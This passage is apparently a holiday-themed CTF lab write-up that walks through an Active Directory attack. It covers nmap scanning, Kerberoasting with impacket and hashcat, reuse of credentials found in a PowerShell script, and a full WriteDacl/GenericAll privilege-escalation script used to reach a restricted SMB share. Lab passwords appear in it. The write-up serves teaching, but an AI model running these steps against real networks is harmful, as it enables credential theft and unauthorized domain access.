+<summary>Screenshot</summary>
+<p><img alt="" src="image1.png" /></p>
+</details>
+<h3 id="step-2-investigate-the-network">Step 2: Investigate the Network</h3>
+<p>First, let's determine our own IP address<br>
+<code>ifconfig</code></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image2.png" /></p>
+</details>
+<p>We could scan our entire class B network (172.17.0.2/16), but that would take quite a while so lets instead start with the smaller address space represented by 172.17.0.2/24 .<br>
+<code>nmap 172.17.0.2/24</code></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image3.png" /></p>
+</details>
+<p>From this scan we see that some of the machines are running the netbios-ssn service on port 139, which is where SMB shares will be found.  Since our objective is to locate a research document there is a good chance that it will be located on a file share somewhere.</p>
+<p>Querying each of the systems with the command <code>smbclient -L &lt;ip address&gt;</code> we find that 172.17.0.3 is serving two promising sounding shares, 'elfu_svc_shr' and 'research_dep', but of course our account does not have access to them.</p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image4.png" /></p>
+</details>
+<h3 id="step-3-steal-a-hash">Step 3: Steal a Hash</h3>
+<p>The GetUserSPNs utility provided in SecureAuthCorp's impacket toolkit can be used to find Service Principle Names that are associated with user accounts.  If one if found then the utility will request a service ticket for that SPN which will allow it to obtain the hash of the user account password.  </p>
+<p>First, we download GetUsersSPNs.py from the impacket GitHub repository to our local system, then transfer it to the ElfU system using <code>scp</code><br></p>
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
+scp -P 2222 GetUserSPNs.py nrsquaxzmg@grades.elfu.org:~/
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image5.png" /></p>
+</details>
+<p>Now on the ElfU system, run GetUserSPNs.py</p>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code>python3 ./GetUserSPNs.py elfu.local/nrsquaxzmg:Zapvnxoth@ -outputfile hashes.kerberoast
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image6.png" /></p>
+</details>
+<p>We have now captured the password hash for the elfu_svc account into the file hashes.kerberoast.</p>
+<h3 id="step-4-crack-the-hash">Step 4: Crack the Hash</h3>
+<p>Bring the file containing the password hash for the elfu_svc account back to our local system.
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>scp -P 2222 nrsquaxzmg@grades.elfu.org:~/hashes.kerberoast ./
+</code></pre></div></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image7.png" /></p>
+</details>
+<p>Use CeWL to build a wordlist from the ElfU registration portal that we will use as a base for our password cracking attempt.
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>cewl --with-numbers https://register.elfu.org/register &gt; wordlist.txt
+</code></pre></div></p>
+<p>Now, crack the hash using the wordlist and the OneRuleToRuleThemAll rule file.
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>hashcat -m 13100 -a 0 ./hashes.kerberoast --potfile-disable -r ./OneRuleToRuleThemAll.rule --force -O wordlist.txt
+</code></pre></div></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image8.png" /></p>
+</details>
+<h3 id="step-5-investigate-the-elfu_svc_shr-file-share">Step 5: Investigate the elfu_svc_shr File Share</h3>
+<p>Now that we know the password for the elfu_svc account (Snow2021!), we can use it to connect to the elfu_svc_shr file share that we found earlier.</p>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code>smbclient \\\\172.17.0.3\\elfu_svc_shr -U elfu_svc
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image9.png" /></p>
+</details>
+<p>Looking at the files we find a lot of PowerShell scripts.  Retrieve them all to our local system so we can inspect them for anything interesting.<br></p>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code>smb: \&gt; prompt off
+smb: \&gt; mget *.ps1
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image10.png" /></p>
+</details>
+<p>Now we search the files for anything that might provide us with additional access.  Possible things to search for would be the strings 'password' or 'username', but neither of those got any interesting results.  What does get a result is the string 'elfu.local', which is found in a single PowerShell script named 'GetProcessInfo.ps1'<br></p>
+<p><img alt="" src="image11.png" /></p>
+<div class="highlight"><span class="filename">GetProcessInfo.ps1</span><pre><span></span><code><span class="nv">$SecStringPassword</span> <span class="p">=</span> <span class="s2">&quot;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&quot;</span>
+<span class="nv">$aPass</span> <span class="p">=</span> <span class="nv">$SecStringPassword</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="n">2</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">2</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">5</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">7</span><span class="p">,</span><span class="n">7</span>
+<span class="nv">$aCred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="s2">&quot;elfu.local\remote_elf&quot;</span><span class="p">,</span> <span class="nv">$aPass</span><span class="p">)</span>
+<span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Process</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
+</code></pre></div>
+<p>This script contains encrypted authentication credentials for the account 'remote_elf' to run remote PowerShell commands against the computer with the IP address 10.128.1.53.  While we do not know the password for the remote_elf account, we can use the same process that GetProcessInfo.ps1 uses to run commands of our own on the remote machine.</p>
+<h3 id="step-6-get-access-to-the-research_dep-share">Step 6: Get Access to the research_dep Share</h3>
+<p>Start the Linux version of PowerShell with the <code>pwsh</code> command and execute the first three lines of the GetProcesssInfo.ps1 script.  This will setup things so that from here forward we only have to enter the various <code>Invoke-Command</code> commands.</p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image12.png" /></p>
+</details>
+<p>It's probably a valid assumption that the research file we are trying to access is located on the research_dep share.  Access to shares is often controlled by security groups, so we use the <code>Invoke-Command</code> command from GetProcessInfo.ps1 with our own content for the <code>ScriptBlock</code> parameter to find any groups with the word 'research' in the name.</p>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-ADGroup</span> <span class="n">-filter</span> <span class="s2">&quot;Name -like &#39;*research*&#39;&quot;</span> <span class="n">-properties</span> <span class="n">Name</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image13.png" /></p>
+</details>
+<p>Now we know that there is a security group named 'Research Department'.  Using the PowerShell scripts referenced in Chris Davis' KringleCon talk as a starting point we can create a script that will let us see any users that have WriteDacl rights to this group.</p>
+<div class="highlight"><span class="filename">Who_Has_WriteDacl.ps1</span><pre><span></span><code><span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
+<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_ObjectSecurity</span><span class="p">().</span><span class="n">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s1">&#39;WriteDacl&#39;</span><span class="p">}</span>
+</code></pre></div>
+<p>Transfer this script to the ElfU server using <code>scp</code> and execute it using <code>Invoke-Command</code></p>
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>scp -P 2222 Who_Has_WriteDacl.ps1 cauovojfjy@grades.elfu.org:~/
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image14.png" /></p>
+</details>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-FilePath</span> <span class="n">Who_Has_WriteDacl</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image15.png" /></p>
+</details>
+<p>Conveniently for us, the remote_elf account has WriteDacl to this group.</p>
+<p>The next steps in the process is to give our user the GenericALL AD right to the group and then to add it to the group itself.  Again, referencing the sample scripts from Chris Davis' we can write a single script to perform both operations.</p>
+<div class="highlight"><span class="filename">Grant_GenericAll_and_Add_to_Group.ps1</span><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span>
+<span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
+<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&quot;cauovojfjy&quot;</span>
+<span class="nv">$password</span> <span class="p">=</span> <span class="s2">&quot;Ufjeprxjh#&quot;</span>
+<span class="nv">$user</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&quot;elfu.local\$username&quot;</span><span class="p">)</span>
+<span class="nv">$nullGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span class="nv">$propGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span class="nv">$sid</span><span class="p">=</span><span class="nv">$user</span><span class="p">.</span><span class="n">Translate</span><span class="p">(</span><span class="no">[System.Security.Principal.SecurityIdentifier]</span><span class="p">)</span>
+<span class="nv">$inheritanceType</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectorySecurityInheritance]</span><span class="p">::</span><span class="n">None</span>
+
+<span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectoryAccessRule</span> <span class="nv">$sid</span><span class="p">,</span> <span class="p">(</span><span class="no">[System.DirectoryServices.ActiveDirectoryRights]</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">),</span> <span class="p">(</span><span class="no">[System.Security.AccessControl.AccessControlType]</span> <span class="s2">&quot;Allow&quot;</span><span class="p">),</span> <span class="nv">$propGUID</span><span class="p">,</span> <span class="nv">$inheritanceType</span><span class="p">,</span> <span class="nv">$nullGUID</span>
+<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span>
+<span class="nv">$secOptions</span> <span class="p">=</span> <span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_Options</span><span class="p">()</span>
+<span class="nv">$secOptions</span><span class="p">.</span><span class="n">SecurityMasks</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.SecurityMasks]</span><span class="p">::</span><span class="n">Dacl</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">RefreshCache</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_ObjectSecurity</span><span class="p">().</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
+
+<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
+<span class="nv">$b</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="nv">$sid</span><span class="p">.</span><span class="n">BinaryLength</span>
+<span class="nv">$sid</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
+<span class="nv">$hexSID</span><span class="p">=</span><span class="no">[BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$b</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;LDAP://&lt;SID=$hexSID&gt;&quot;</span><span class="p">)</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
+</code></pre></div>
+<p>Again, transfer this script to the ElfU server using <code>scp</code> and execute it.  Then, verify that our user has been added to the Research Department group.</p>
+<p><div class="highlight"><span class="filename">Local System</span><pre><span></span><code>scp -P 2222 Grant_GenericAll_and_Add_to_Group.ps1 cauovojfjy@grades.elfu.org:~/
+</code></pre></div>
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-FilePath</span> <span class="n">Grant_GenericAll_and_Add_to_Group</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
+<span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-ADUser</span> <span class="n">-identity</span> <span class="n">cauovojfjy</span> <span class="n">-properties</span> <span class="n">MemberOf</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
+</code></pre></div></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image16.png" /></p>
+</details>
+<h3 id="step-7-retrieve-the-file-from-the-research_dep-share">Step 7: Retrieve the file from the research_dep share</h3>
+<p>Now that we are in the Research Department security group, connect to the research_dep share.
+<div class="highlight"><span class="filename">ElfU System</span><pre><span></span><code>smbclient \\\\172.17.0.3\\research_dep -U cauovojfjy
+</code></pre></div></p>
+<p>Once connected, we find the file SantaSecretToAWonderfulHolidaySeason.pdf, so retrieve it with <code>smb get</code><br></p>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image17.png" /></p>
+</details>
+<p>Finally, retrieve the file to our local system using <code>scp</code> and open it to find the answer to the objective.</p>
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>scp -P 2222 cauovojfjy@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf ./
+</code></pre></div>
+<details class="info">
+<summary>Screenshot</summary>
+<p><img alt="" src="image18.png" /></p>
+</details>
+<h2 id="completion">Completion</h2>
+<div class="admonition success">
+<p class="admonition-title">Answer</p>
+<p>Kindness</p>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../O7_Printer_Exploitation/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 7) Printer Exploitation" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              7) Printer Exploitation
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../O9_Splunk/" class="md-footer__link md-footer__link--next" aria-label="Next: 9) Splunk!" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              9) Splunk!
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.tabs.link"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.e1a181d9.min.js"></script>
+      
+    
+  </body>
+</html>
